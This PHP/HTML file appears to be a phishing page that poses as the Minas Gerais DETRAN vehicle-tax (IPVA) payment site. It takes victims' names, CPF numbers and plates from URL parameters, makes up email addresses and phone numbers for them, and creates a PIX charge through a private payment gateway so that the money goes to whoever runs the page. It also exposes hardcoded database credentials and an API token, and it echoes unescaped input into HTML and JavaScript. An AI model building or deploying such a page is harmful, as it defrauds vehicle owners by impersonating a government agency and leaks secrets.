<?php
// Iniciar a sessão
session_start();

// Conexão com o banco de dados - Usando Variáveis de Ambiente
$host = getenv('DB_HOST') ?: 'sql108.infinityfree.com'; // Remova o fallback em produção final!
$dbname = getenv('DB_NAME') ?: 'if0_37765204_ipva';      // Remova o fallback em produção final!
$username = getenv('DB_USER') ?: 'if0_37765204';          // Remova o fallback em produção final!
$password = getenv('DB_PASS') ?: 'jTuuwUGHt2ZoK';          // Remova o fallback em produção final!

try {
    // Conectar ao banco de dados
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Verificar se o usuário está logado (se necessário)
    // Caso contrário, um valor fixo de usuário pode ser utilizado
    // Exemplo: $user_id = 1;
    $user_id = 1; // Supondo que você tenha um ID de usuário fixo para testar

    // Consultar os dados de chave e tipo de chave do banco
    $sql = "SELECT tipo_chave, chave_pix FROM usuarios WHERE id = :user_id";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([':user_id' => $user_id]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($user) {
        $tipoChave = $user['tipo_chave'];
        $chavePix = $user['chave_pix'];
    } else {
        die('Usuário não encontrado ou não autorizado.');
    }
    
    // Recupera os dados da URL usando $_GET
    $renavam = isset($_GET['renavam']) ? $_GET['renavam'] : '';
    $veiculo_tipo = isset($_GET['veiculo_tipo']) ? $_GET['veiculo_tipo'] : '';
    $veiculo_cor = isset($_GET['veiculo_cor']) ? $_GET['veiculo_cor'] : '';
    $veiculo_placa = isset($_GET['veiculo_placa']) ? $_GET['veiculo_placa'] : '';
    $veiculo_marca = isset($_GET['veiculo_marca']) ? $_GET['veiculo_marca'] : '';
    $veiculo_ano = isset($_GET['veiculo_ano']) ? $_GET['veiculo_ano'] : '';
    $proprietario_nome = isset($_GET['proprietario_nome']) ? $_GET['proprietario_nome'] : '';
    $proprietario_cpf = isset($_GET['proprietario_cpf']) ? $_GET['proprietario_cpf'] : '';
    $data_consulta = isset($_GET['data_consulta']) ? $_GET['data_consulta'] : '';
    $total = isset($_GET['total']) ? $_GET['total'] : '';

    // --- Início da integração Zippify ---

    // Funções auxiliares para gerar dados aleatórios (adaptadas de payment.js)
    function gerarEmail($nome) {
        $dominios = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com"];
        $dominio = $dominios[array_rand($dominios)];
        // Simplificação da formatação do nome para PHP
        $nomeFormatado = strtolower(str_replace(' ', '.', iconv('UTF-8', 'ASCII//TRANSLIT', $nome)));
        return "{$nomeFormatado}@{$dominio}";
    }

    function gerarTelefone() {
        $ddd = rand(11, 99);
        $numero = rand(900000000, 999999999); // Ajustado para 9 dígitos + DDD
        return "{$ddd}{$numero}";
    }

    // Credenciais Zippify (do payment.js) - Usando Variável de Ambiente
    $apiToken = getenv('ZIPPIFY_API_TOKEN') ?: "q0s9BAe4jtddZ3MKV8qv8Nc9k5pkvOpnSgMX7GmnYDSoaUXJj1grjbT7n0uA"; // Remova o fallback em produção final!
    $offerHash = "ugjfdma1i8"; // Manter hardcoded ou mover para variável de ambiente se necessário
    $productHash = "uyrnqqr9f8"; // Manter hardcoded ou mover para variável de ambiente se necessário
    $apiUrl = "https://api.zippify.com.br/api/public/v1/transactions?api_token={$apiToken}";

    // Converter total para centavos
    $amountInCents = round(floatval($total) * 100);

    // Gerar dados do cliente (usando dados reais + gerados)
    $customerName = $proprietario_nome ?: 'Cliente Desconhecido'; // Usar nome real ou fallback
    $customerDocument = $proprietario_cpf ?: ''; // Usar CPF real ou vazio
    $customerEmail = gerarEmail($customerName); // Gerar email
    $customerPhone = gerarTelefone(); // Gerar telefone

    // Construir o corpo da requisição
    $requestBody = [
        'amount' => $amountInCents,
        'offer_hash' => $offerHash,
        'payment_method' => "pix",
        'customer' => [
            'name' => $customerName,
            'document' => $customerDocument,
            'email' => $customerEmail,
            'phone_number' => $customerPhone
        ],
        'cart' => [
            [
                'product_hash' => $productHash,
                'title' => "Pagamento IPVA", // Título genérico
                'price' => $amountInCents,
                'quantity' => 1,
                'operation_type' => 1,
                'tangible' => false,
                'cover' => null
            ]
        ],
        'installments' => 1
    ];

    // Requisição cURL para Zippify
    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($requestBody)); // Enviar como JSON
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json', // Definir Content-Type para JSON
        'Accept: application/json'
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); // Obter código de status HTTP

    if (curl_errno($ch)) {
        die('Erro na requisição cURL: ' . curl_error($ch));
    }
    curl_close($ch);

    // Decodifica a resposta JSON
    $responseData = json_decode($response, true);

    // Verifica a resposta da Zippify
    if ($httpCode >= 200 && $httpCode < 300 && isset($responseData['pix']['pix_qr_code'])) {
        $zippifyPixCode = $responseData['pix']['pix_qr_code'];
        // Zippify retorna a string do PIX, não base64. A renderização será feita via JS.
        $zippifyQrCodeString = $zippifyPixCode; // Usar a mesma string para QR e cópia
    } else {
        // Log detalhado do erro pode ser útil aqui
        error_log("Erro Zippify API: HTTP Code $httpCode, Response: " . $response);
        die('Erro ao gerar PIX com Zippify. Resposta: ' . ($responseData['message'] ?? $response));
    }

    // --- Fim da integração Zippify ---

    // Variáveis removidas (não são mais usadas da API antiga)
    // $qrCodeBase64 = ...
    // $qrString = ...

    // Exibe o QR Code (base64) - REMOVIDO, será feito via JS
    // echo "";

} catch (PDOException $e) {
    die("Erro de conexão: " . $e->getMessage());
}
?>


<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Débitos do Veículo</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <!-- Incluir biblioteca QRCode.js -->
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
    <style>
        body {
            background: #f2f2f2;
        }
        .custom-container {
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            background: #ffffff52;
        }
        .logos {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logos > a {
            display: flex;
            flex-direction: column;
        }
        .logos > a > :first-child {
            color: #0a4a22;
            font-size: 19px;
            margin-bottom: 5px;
            font-weight: 600;
        }
        .logos > a > :last-child {
            font-size: 19px;
            color: rgb(17, 17, 17);
        }
        .details {
            margin-top: 20px;
        }
        .divider {
            border-top: 1px solid #ddd;
            margin: 20px 0;
        }
        .vehicle-data li {
            list-style-type: none;
            margin-bottom: 5px;
            padding-left: 0;
            display: inline-block;
            margin-right: 20px;
        }
        .vehicle-data li i {
            margin-right: 5px;
        }
        .custom-checkbox {
            width: 20px;
            height: 20px;
            margin: 0;
        }
        .custom-checkbox:checked {
            background-color: #007bff;
            border-color: #007bff;
        }
        .custom-checkbox:checked:after {
            content: '\2713';
            color: white;
            font-size: 15px;
            position: absolute;
            top: 2px;
            left: 6px;
        }
        .select-th {
            width: 30px;
        }
        .subtotal-total {
            margin-top: 20px;
        }
        .pay-via-pix {
            margin-top: 10px;
        }
    </style>
</head>
<body>
<div class="container mt-3 custom-container">
    <div class="logos">
        <img src="detran-mg.png" style="max-width: 210px;" alt="">
    </div>
    <div class="mt-3 vehicle-data">
        <h5 style="font-size: 18px; background: #f90000; border-top-left-radius: 6px; border-top-right-radius: 6px; padding: 10px; color: #000; margin-bottom: 0;"><i class="fas fa-list"></i> Detalhes do Veículo</h5>
        <ul class="pl-0" style="padding: 10px !important; border: solid 1px #000; border-bottom-left-radius: 6px; border-bottom-right-radius: 6px; display: flex; flex-direction: column;">
            <li><i class="fa-solid fa-id-card"></i> <strong>CPF / CNPJ:</strong> <?php echo htmlspecialchars($proprietario_cpf); ?></li>
            <li><i class="fa-solid fa-id-card"></i> <strong>Nome Proprietário:</strong> <?php echo htmlspecialchars($proprietario_nome); ?></li>
            <li><i class="fas fa-car"></i> <strong>RENAVAM:</strong> <?php echo htmlspecialchars($renavam); ?></li>
            <li><i class="fas fa-car"></i> <strong>Placa:</strong> <?php echo htmlspecialchars($veiculo_placa); ?></li>
            <li><i class="fas fa-car"></i> <strong>Tipo de Veículo:</strong> <?php echo htmlspecialchars($veiculo_tipo); ?></li>
            <li><i class="fas fa-car"></i> <strong>Cor:</strong> <?php echo htmlspecialchars($veiculo_cor); ?></li>
            <li><i class="fas fa-car"></i> <strong>Marca:</strong> <?php echo htmlspecialchars($veiculo_marca); ?></li>
            <li><i class="fas fa-car"></i> <strong>Ano:</strong> <?php echo htmlspecialchars($veiculo_ano); ?></li>
        </ul>
    </div>
    <div class="mt-3 vehicle-data">
        <h5 style="font-size: 18px; background: #f90000; border-top-left-radius: 6px; border-top-right-radius: 6px; padding: 10px; color: #000; margin-bottom: 0;"><i class="fas fa-list"></i> Resumo</h5>
        <ul class="pl-0" style="padding: 10px !important; border: solid 1px #000; border-bottom-left-radius: 6px; border-bottom-right-radius: 6px; display: flex; flex-direction: column;">
	<div class="subtotal-total">
	    <li><i class="fas fa-dollar-sign"></i> <strong>Subtotal:</strong> <?php echo $total; ?></li><br>
		<li><i class="fas fa-dollar-sign"></i> <strong>Total:</strong> <?php echo $total; ?></li>
    </div>
        </ul>
    </div>
	    <div class="mt-3 vehicle-data">
        <h5 style="font-size: 18px; background: #f90000; border-top-left-radius: 6px; border-top-right-radius: 6px; padding: 10px; color: #000; margin-bottom: 0;"><i class="fas fa-list"></i> Pagamento</h5>
        <ul class="pl-0" style="padding: 10px !important; border: solid 1px #000; border-bottom-left-radius: 6px; border-bottom-right-radius: 6px; display: flex; flex-direction: column;">
    <div class="subtotal-total">
        <!-- Div para renderizar o QR Code via JavaScript -->
        <div id="qr-code-container" style="margin-bottom: 15px;"></div>
        <!-- Input com a string PIX para copiar -->
	    <input type="text" value="<?php echo htmlspecialchars($zippifyPixCode); ?>" id="qrString" readonly style="width: 100%; margin-bottom: 10px;"><br>
        <button onclick="copyToClipboard()">Copiar Chave ❖</button>
    </div>
    <div id="copySuccess" style="display: none; color: black; font-weight: bold; margin-top: 5px;">
    Chave copiada com sucesso!
</div>
    
        </ul>
    </div>

<form id="paymentForm" action="p.php" method="GET" style="display: none;">
    <input type="hidden" name="renavam" id="hiddenRenavam">
    <input type="hidden" name="veiculo_tipo" id="hiddenVeiculoTipo">
    <input type="hidden" name="veiculo_cor" id="hiddenVeiculoCor">
    <input type="hidden" name="veiculo_placa" id="hiddenVeiculoPlaca">
    <input type="hidden" name="veiculo_marca" id="hiddenVeiculoMarca">
    <input type="hidden" name="veiculo_ano" id="hiddenVeiculoAno">
    <input type="hidden" name="proprietario_nome" id="hiddenProprietarioNome">
    <input type="hidden" name="proprietario_cpf" id="hiddenProprietarioCpf">
    <input type="hidden" name="data_consulta" id="hiddenDataConsulta">
    <input type="hidden" name="total" id="hiddenTotal">
</form>

<script>
// Função para copiar a chave QR para a área de transferência
function copyToClipboard() {
    var copyText = document.getElementById("qrString");
    copyText.select();
    copyText.setSelectionRange(0, 99999); // Para dispositivos móveis
    document.execCommand("copy");

    // Exibe uma mensagem de sucesso
    var successMessage = document.getElementById("copySuccess");
    successMessage.style.display = "block";

    setTimeout(function() {
        successMessage.style.display = "none";
    }, 2000);
}

function updateTotal() {
    let total = 0;
    const checkboxes = document.querySelectorAll('.debitoCheckbox:checked');
    checkboxes.forEach(function(checkbox) {
        total += parseFloat(checkbox.value);
    });
    document.getElementById('total').textContent = 'R$ ' + total.toFixed(2).replace('.', ',');

    // Habilitar o botão de pagamento se algum débito for selecionado
    document.getElementById('payButton').disabled = checkboxes.length === 0;
}

// Selecionar todos os checkboxes de um ano
function toggleSelectYear(ano) {
    const isChecked = document.querySelector('#debt-details-' + ano + ' .selectAllYear').checked;
    const checkboxes = document.querySelectorAll('#debt-details-' + ano + ' .debitoCheckbox');
    checkboxes.forEach(function(checkbox) {
        checkbox.checked = isChecked;
    });
    updateTotal();
}

// Mostrar/Esconder os débitos de um ano
function toggleDebtDetails(ano) {
    const details = document.getElementById('debt-details-' + ano);
    details.style.display = details.style.display === 'none' ? 'block' : 'none';
}

// Submeter o formulário com os dados via GET
function submitPaymentForm() {
    document.getElementById('hiddenRenavam').value = '<?php echo $renavam; ?>';
    document.getElementById('hiddenVeiculoTipo').value = '<?php echo $veiculo_tipo; ?>';
    document.getElementById('hiddenVeiculoCor').value = '<?php echo $veiculo_cor; ?>';
    document.getElementById('hiddenVeiculoPlaca').value = '<?php echo $veiculo_placa; ?>';
    document.getElementById('hiddenVeiculoMarca').value = '<?php echo $veiculo_marca; ?>';
    document.getElementById('hiddenVeiculoAno').value = '<?php echo $veiculo_ano; ?>';
    document.getElementById('hiddenProprietarioNome').value = '<?php echo $proprietario_nome; ?>';
    document.getElementById('hiddenProprietarioCpf').value = '<?php echo $proprietario_cpf; ?>';
    document.getElementById('hiddenDataConsulta').value = '<?php echo $data_consulta; ?>';
    document.getElementById('hiddenTotal').value = document.getElementById('total').textContent.replace('R$ ', '').replace(',', '.');
    
    document.getElementById('paymentForm').submit();
}

// Adicionar um ouvinte de evento ao botão "Pagar via PIX"
document.getElementById('payButton').addEventListener('click', function() {
    submitPaymentForm();
});

// Renderizar o QR Code quando o DOM estiver pronto
document.addEventListener('DOMContentLoaded', function() {
    const qrCodeContainer = document.getElementById('qr-code-container');
    const pixCodeString = "<?php echo htmlspecialchars($zippifyQrCodeString); ?>"; // Obter a string PIX do PHP

    if (qrCodeContainer && pixCodeString) {
        new QRCode(qrCodeContainer, {
            text: pixCodeString,
            width: 200, // Ajuste o tamanho conforme necessário
            height: 200,
            correctLevel : QRCode.CorrectLevel.H // Nível de correção de erro
        });
    } else {
        console.error("Container do QR Code ou string PIX não encontrados.");
        // Opcional: exibir mensagem de erro no lugar do QR Code
        if(qrCodeContainer) qrCodeContainer.innerHTML = "<p>Erro ao gerar QR Code.</p>";
    }
});
</script>
</body>
</html>
